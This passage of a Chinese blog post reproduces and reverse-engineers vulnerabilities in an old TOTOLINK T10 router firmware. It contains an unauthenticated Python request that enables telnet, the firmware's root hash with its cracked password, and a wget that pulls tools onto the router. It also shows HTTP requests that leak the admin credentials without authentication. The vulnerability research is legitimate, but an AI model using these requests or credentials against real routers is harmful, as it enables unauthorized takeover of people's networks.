href=\"http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=70&amp;ids=36\">http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=70&amp;ids=36</a></p>\n<p>好奇怪..用user模式是这个,system模式就不是了…</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508070257022.png\" alt=\"image-20230508070257022\"></p>\n<p>把东西拷其进去后 404了 </p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508072223637.png\" alt=\"image-20230508072223637\"></p>\n<p>但是在服务器里面测试是好的</p>\n<p>搭建图形化界面<a href=\"https://zhuanlan.zhihu.com/p/436458664\">https://zhuanlan.zhihu.com/p/436458664</a></p>\n<p>vnc一开始连不上是防火墙的事,把防火墙关了,可以在图形化界面里直接访问</p>\n<h2 id=\"1-4-真机\"><a href=\"#1-4-真机\" class=\"headerlink\" title=\"1.4 真机\"></a>1.4 真机</h2><p>​\t\t因为自己的机器是mac,m1架构,搭建不了x86的虚拟机,就用的云服务器,比较麻烦,然后环境也有问题,于是买了一个真机,但是真机也有问题,导致自己很崩溃,通宵了一晚上去调试环境,但不论怎么搭建虚拟环境或者用真机,在登录页面点击登陆后,都登陆不进去</p>\n<p>​\t\t后来无意中在百度贴吧搜索发现有人和我一样的问题……………居然是要用远古的ie或者360浏览器的兼容模式才能打开…</p>\n<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509154418746.png\" alt=\"image-20230509154418746\" style=\"zoom:33%;\">\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/4022899e2b386926fcc791a13bcb575b.png\" alt=\"4022899e2b386926fcc791a13bcb575b\"></p>\n<h1 id=\"二、-获取初始shell\"><a href=\"#二、-获取初始shell\" class=\"headerlink\" title=\"二、 获取初始shell\"></a>二、 获取初始shell</h1><h2 id=\"2-1-telnet\"><a href=\"#2-1-telnet\" class=\"headerlink\" title=\"2.1 telnet\"></a>2.1 telnet</h2><p>​\t\t在路由器管理后台开启telnet功能,或者直接python发包获取(未授权)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-password获取\"><a href=\"#2-2-password获取\" class=\"headerlink\" title=\"2.2 password获取\"></a>2.2 password获取</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root cat etc/shadow.sample</span><br><span class=\"line\">root:$<span class=\"number\">1</span>$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:<span class=\"number\">16090</span>:<span class=\"number\">0</span>:<span class=\"number\">99999</span>:<span class=\"number\">7</span>:::</span><br><span class=\"line\">nobody:*:<span class=\"number\">14495</span>:<span class=\"number\">0</span>:<span class=\"number\">99999</span>:<span class=\"number\">7</span>:::</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t解密结果是cs2012</p>\n<h1 id=\"三、框架分析\"><a href=\"#三、框架分析\" class=\"headerlink\" title=\"三、框架分析\"></a>三、框架分析</h1><h2 id=\"3-1-目录梳理\"><a href=\"#3-1-目录梳理\" class=\"headerlink\" title=\"3.1 目录梳理\"></a>3.1 目录梳理</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--bin\t\t\t\t\t二进制文件</span><br><span class=\"line\">--lib</span><br><span class=\"line\">    --cste_modules  \t.so库文件</span><br><span class=\"line\">--web_cste    \t\t\t浏览器web后台主目录</span><br><span class=\"line\">\t--adm\t\t\t\t管理员后台</span><br><span class=\"line\">    --cgi-bin\t\t\t功能处理</span><br><span class=\"line\">    --firewall    \t\t防火墙功能</span><br><span class=\"line\">\tlogin.asp\t\t\t登陆页面</span><br><span class=\"line\">    telnet.asp\t\t\ttelnet控制页面</span><br></pre></td></tr></table></figure>\n\n\n\n<p>进去之后\t 进行信息收集, 先传一个busybox-mipsel</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server <span class=\"number\">80</span> 起一个服务,传一下</span><br><span class=\"line\">wget http:<span class=\"comment\">//xxxxxxxx/busybox-mipsel</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t收集进程信息</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1028</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> udhcpd /var/udhcpd.conf</span><br><span class=\"line\"><span class=\"number\">1269</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> ppp_inet -t <span class=\"number\">3</span> -c <span class=\"number\">0</span> -x</span><br><span class=\"line\"><span class=\"number\">1279</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> dnsmasq</span><br><span class=\"line\"><span class=\"number\">1285</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> lld2d br0</span><br><span class=\"line\"><span class=\"number\">1301</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> fwd</span><br><span class=\"line\"><span class=\"number\">1329</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> cs_broker -c /etc/mosquitto.conf</span><br><span class=\"line\"><span class=\"number\">1335</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> cste_sub -h <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> -t totolink/router/#</span><br><span class=\"line\"><span class=\"number\">1352</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> telnetd</span><br><span class=\"line\"><span class=\"number\">1360</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> csteDriverConnMachine</span><br><span class=\"line\"><span class=\"number\">1365</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> crond</span><br><span class=\"line\"><span class=\"number\">1366</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> [kworker/<span class=\"number\">0</span>:<span class=\"number\">1</span>H]</span><br><span class=\"line\"><span class=\"number\">1376</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib/</span><br><span class=\"line\"><span class=\"number\">1398</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> /bin/getty -L ttyS0 <span class=\"number\">38400</span> vt100</span><br><span class=\"line\"><span class=\"number\">1400</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> watchdog -c /var/cs_watchdog.conf</span><br><span class=\"line\"><span class=\"number\">1924</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> -sh</span><br><span class=\"line\"><span class=\"number\">2178</span> root       <span class=\"number\">0</span>:<span class=\"number\">00</span> ./busybox-mipsel ps auxf</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t网络信息</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ./busybox-mipsel netstat -alp</span><br><span class=\"line\">Active Internet <span class=\"title function_\">connections</span> <span class=\"params\">(servers and established)</span></span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class=\"line\">tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      1376/lighttpd</span><br><span class=\"line\">tcp        0      0 0.0.0.0:domain          0.0.0.0:*               LISTEN      1279/dnsmasq</span><br><span class=\"line\">tcp        0      0 0.0.0.0:telnet          0.0.0.0:*               LISTEN      1352/telnetd</span><br><span class=\"line\">tcp        0      0 0.0.0.0:1883            0.0.0.0:*               LISTEN      1329/cs_broker</span><br><span class=\"line\">tcp        0      0 127.0.0.1:1883          127.0.0.1:56383         ESTABLISHED 1329/cs_broker</span><br><span class=\"line\">tcp        0      0 127.0.0.1:56383         127.0.0.1:1883          ESTABLISHED 1335/cste_sub</span><br><span class=\"line\">tcp        0    157 router.totolink.com:telnet 192.168.55.3:62063      ESTABLISHED 1352/telnetd</span><br><span class=\"line\">netstat: /proc/net/tcp6: No such file or directory</span><br><span class=\"line\">udp        0      0 0.0.0.0:domain          0.0.0.0:*                           1279/dnsmasq</span><br><span class=\"line\">udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           1028/udhcpd</span><br><span class=\"line\">netstat: /proc/net/udp6: No such file or directory</span><br><span class=\"line\">netstat: /proc/net/raw6: No such file or directory</span><br><span class=\"line\">Active UNIX domain <span class=\"title function_\">sockets</span> <span class=\"params\">(servers and established)</span></span><br><span class=\"line\">Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1590 1335/cste_sub</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1282 1028/udhcpd</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1591 1335/cste_sub</span><br><span class=\"line\">unix  3      [ ]         STREAM     CONNECTED       1283 1028/udhcpd</span><br><span class=\"line\">unix  2      [ ]         DGRAM                      1488 1279/dnsmasq</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"四、逻辑功能、业务流程梳理\"><a href=\"#四、逻辑功能、业务流程梳理\" class=\"headerlink\" title=\"四、逻辑功能、业务流程梳理\"></a>四、逻辑功能、业务流程梳理</h1><h2 id=\"4-1-登陆\"><a href=\"#4-1-登陆\" class=\"headerlink\" title=\"4.1 登陆\"></a>4.1 登陆</h2><p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230513200756944.png\" alt=\"image-20230513200756944\"></p>\n<p>​\t\tformLoginAuth.htm 这个东西其实在lighttpd里面, 它只是一个变量名,不代表文件,判断这个文件名,会调用Form_Login函数</p>\n<h3 id=\"4-1-1-密码泄露\"><a href=\"#4-1-1-密码泄露\" class=\"headerlink\" title=\"4.1.1 密码泄露\"></a>4.1.1 密码泄露</h3><p>这个请求包存在一个问题,即不论用户名密码是否正确,都调用它,然后返回前端,于是就有了一个用户名密码泄露漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /cgi-bin/cstecgi.cgi HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded; charset=UTF<span class=\"number\">-8</span></span><br><span class=\"line\">Accept: *<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">X-Requested-With: XMLHttpRequest</span></span><br><span class=\"line\"><span class=\"comment\">Referer: http://192.168.0.1/title.asp</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-Hans-CN,zh-Hans;q=0.5</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 37</span></span><br><span class=\"line\"><span class=\"comment\">Host: 192.168.0.1</span></span><br><span class=\"line\"><span class=\"comment\">Pragma: no-cache</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: SESSION_ID=2:1516657290:2</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">&#123;&quot;topicurl&quot;:&quot;setting/getLanguageCfg&quot;&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">HTTP/1.1 200 OK</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: text/plain</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 340</span></span><br><span class=\"line\"><span class=\"comment\">Pragma: no-cache</span></span><br><span class=\"line\"><span class=\"comment\">Cache-Control: no-cache</span></span><br><span class=\"line\"><span class=\"comment\">Date: Mon, 22 Jan 2018 21:36:50 GMT</span></span><br><span class=\"line\"><span class=\"comment\">Server: lighttpd/1.4.20</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;operationMode&quot;:\t0,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;loginFlag&quot;:\t1,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;multiLangBt&quot;:\t1,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;helpBt&quot;:\t1,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;fmVersion&quot;:\t&quot;V5.9c.1485&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;title&quot;:\t&quot;TOTOLINK&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;langFlag&quot;:\t0,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;languageType&quot;:\t&quot;cn&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;helpUrl&quot;:\t&quot;www.totolink.cn&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;usbFlag&quot;:\t0,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;productName&quot;:\t&quot;T10&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;lanIp&quot;:\t&quot;192.168.0.1&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;wanConnStatus&quot;:\t&quot;disconnected&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;loginUser&quot;:\t&quot;admin&quot;,</span></span><br><span class=\"line\"><span class=\"comment\">\t&quot;loginPass&quot;:\t&quot;123456888&quot;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514173245584.png\" alt=\"image-20230514173245584\"></p>\n<h2 id=\"4-2-admin后台\"><a href=\"#4-2-admin后台\" class=\"headerlink\" title=\"4.2 admin后台\"></a>4.2 admin后台</h2><h3 id=\"4-2-1-password-asp\"><a href=\"#4-2-1-password-asp\" class=\"headerlink\" title=\"4.2.1 password.asp\"></a>4.2.1 password.asp</h3><p>​\t\t通过setting&#x2F;getPasswordCfg接口可以直接获取密码,而且未做鉴权</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var rJson;</span><br><span class=\"line\">$(function()&#123;</span><br><span class=\"line\">\tvar postVar=&#123;topicurl:<span class=\"string\">&quot;setting/getPasswordCfg&quot;</span>&#125;;</span><br><span class=\"line\">\tpostVar=JSON.stringify(postVar);</span><br><span class=\"line\">\t$.ajax(&#123;  </span><br><span class=\"line\">       \ttype : <span class=\"string\">&quot;post&quot;</span>, url : <span class=\"string\">&quot; /cgi-bin/cstecgi.cgi&quot;</span>, data : postVar, async : <span class=\"literal\">false</span>, success : function(Data)&#123;</span><br><span class=\"line\">\t\t\trJson=JSON.parse(Data);</span><br><span class=\"line\">\t\t\tsupplyValue(<span class=\"string\">&quot;admuser&quot;</span>,rJson[<span class=\"string\">&#x27;admuser&#x27;</span>]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">    &#125;);\t\t</span><br><span class=\"line\">\t$(<span class=\"string\">&quot;#div_admpass11,#div_admpass21&quot;</span>).show();<span class=\"comment\">//p</span></span><br><span class=\"line\">\t$(<span class=\"string\">&quot;#div_admpass12,#div_admpass22&quot;</span>).hide();<span class=\"comment\">//t</span></span><br><span class=\"line\">\ttry&#123; </span><br><span class=\"line\">\t\tparent.frames[<span class=\"string\">&quot;title&quot;</span>].initValue();</span><br><span class=\"line\">\t&#125;catch(e)&#123;&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<h3 id=\"4-2-2-所以asp里的功能-是怎么对应到后面的\"><a href=\"#4-2-2-所以asp里的功能-是怎么对应到后面的\" class=\"headerlink\" title=\"4.2.2 所以asp里的功能 是怎么对应到后面的?\"></a>4.2.2 所以asp里的功能 是怎么对应到后面的?</h3><p>​\t\t答: 通过mqtt协议转发,前端的功能,通过类似于setting&#x2F;getPasswordCfg的消息,发送给代理程序,然后代理程序交给后端服务处理程序来处理,然后再相反路径返回结果</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230513201442154.png\" alt=\"image-20230513201442154\"></p>\n<h3 id=\"4-2-3-客户端如何转发的请求-为什么-x2F-cgi-bin-x2F-cstecgi-cgi里面对应的功能不全呢\"><a href=\"#4-2-3-客户端如何转发的请求-为什么-x2F-cgi-bin-x2F-cstecgi-cgi里面对应的功能不全呢\" class=\"headerlink\" title=\"4.2.3 客户端如何转发的请求?为什么&#x2F;cgi-bin&#x2F;cstecgi.cgi里面对应的功能不全呢?\"></a>4.2.3 客户端如何转发的请求?为什么&#x2F;cgi-bin&#x2F;cstecgi.cgi里面对应的功能不全呢?</h3><p>​\t\t比如setting&#x2F;getPasswordCfg  它其实是在 system.so里\t</p>\n<p>​\t\t答:cstecgi.cgi里并没有包含所有功能,它主要是包含了请求重定向,登陆等功能,其余的功能,会通过转发请求和加载库的机制实现</p>\n<p>在这里匹配不到的最后都会通过else里的这两个函数进行转发请求,给后面的处理程序进行处理. 可以看到,这里转发给了mqtt的代理程序,因为连接到了1883端口.</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514100251357.png\" alt=\"image-20230514100251357\"></p>\n<p>​\t\tweb_getData的参数可以往前追溯分析,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v23 = *(_DWORD *)(cJSON_GetObjectItem(v13, <span class=\"string\">&quot;topicurl&quot;</span>) + <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tv23: topicurl的值, 例如setting&#x2F;getPasswordCfg</p>\n<p>​\t\tv30: 其他的参数值</p>\n<p>​\t\t那么这两个函数又是在哪里呢? 搜索发现是在libmosquitto.so库里,它是一个开源的组件,就是由它来负责具体的mqtt消息的处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -rin set_CSTEInfo</span><br><span class=\"line\">Binary file ./lib/libmosquitto.so matches</span><br><span class=\"line\">Binary file ./web_cste/cgi-bin/cstecgi.cgi matches</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510153255735.png\" alt=\"image-20230510153255735\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514102745718.png\" alt=\"image-20230514102745718\"></p>\n<p>v16[0]  0 </p>\n<p>v16[1]  1883 </p>\n<p>v16[2]  127.0.0.1</p>\n<p>v16[3] </p>\n<p>v16[4]  totolink&#x2F;router&#x2F;setting&#x2F;setxxxxCfg</p>\n<p>v16这个数组即发送的请求,传到client_config_load,然后传到  v10 &#x3D; sub_F8DC(a1, a2, a3, a4);</p>\n<p>​\t\t可以看到,它会给消息分配一块堆空间,然后存储到这里</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( mosquitto_sub_topic_check(*(_DWORD *)(a4 + <span class=\"number\">4</span> * (i + <span class=\"number\">1</span>))) == <span class=\"number\">3</span> )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"built_in\">fprintf</span>(</span><br><span class=\"line\">       <span class=\"built_in\">stderr</span>,</span><br><span class=\"line\">       <span class=\"string\">&quot;Error: Invalid subscription topic &#x27;%s&#x27;, are all &#x27;+&#x27; and &#x27;#&#x27; wildcards correct?\\n&quot;</span>,</span><br><span class=\"line\">       *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(a4 + <span class=\"number\">4</span> * (i + <span class=\"number\">1</span>)));</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   ++*(_DWORD *)(a1 + <span class=\"number\">96</span>);</span><br><span class=\"line\">   *(_DWORD *)(a1 + <span class=\"number\">92</span>) = <span class=\"built_in\">realloc</span>(*(<span class=\"type\">void</span> **)(a1 + <span class=\"number\">92</span>), <span class=\"number\">4</span> * *(_DWORD *)(a1 + <span class=\"number\">96</span>));</span><br><span class=\"line\">   v5 = (<span class=\"type\">char</span> **)(*(_DWORD *)(a1 + <span class=\"number\">92</span>) + <span class=\"number\">4</span> * (*(_DWORD *)(a1 + <span class=\"number\">96</span>) - <span class=\"number\">1</span>));</span><br><span class=\"line\">   *v5 = strdup(*(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(a4 + <span class=\"number\">4</span> * (i + <span class=\"number\">1</span>)));</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"4-2-4-如何加载库的呢\"><a href=\"#4-2-4-如何加载库的呢\" class=\"headerlink\" title=\"4.2.4 如何加载库的呢?\"></a>4.2.4 如何加载库的呢?</h3><p>​\t\t进行逆向推理,首先要找是谁加载了system.so\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -irn <span class=\"string\">&quot;system.so&quot;</span></span><br><span class=\"line\">Binary file ./bin/yddns matches</span><br><span class=\"line\">Binary file ./bin/pppoe-discovery matches</span><br><span class=\"line\">Binary file ./bin/csteDriverConnMachine matches</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t查看了一下这几个文件,发现都没有什么线索,根据网上的资料调查会发现,其实是通过dlopen这个方式加载库,所以.so和system可能进行了拼接,直接搜system就太多了,所以可以搜索路径lib&#x2F;cste_modules</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -irn <span class=\"string\">&quot;lib/cste_modules&quot;</span></span><br><span class=\"line\">Binary file ./bin/cste_sub matches</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以是cste_sub加载了system,在cute_sub的 <font color=\"red\">load_modules()</font>函数中,找到如下加载库的代码,可以看到,进行了路径拼接,以及用opendir和readdir读取目录中的文件.</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514094355795.png\" alt=\"image-20230514094355795\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span>:<span class=\"number\">1883</span>            <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span>:*               LISTEN      <span class=\"number\">1329</span>/cs_broker</span><br><span class=\"line\">tcp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">1883</span>          <span class=\"number\">127.0</span><span 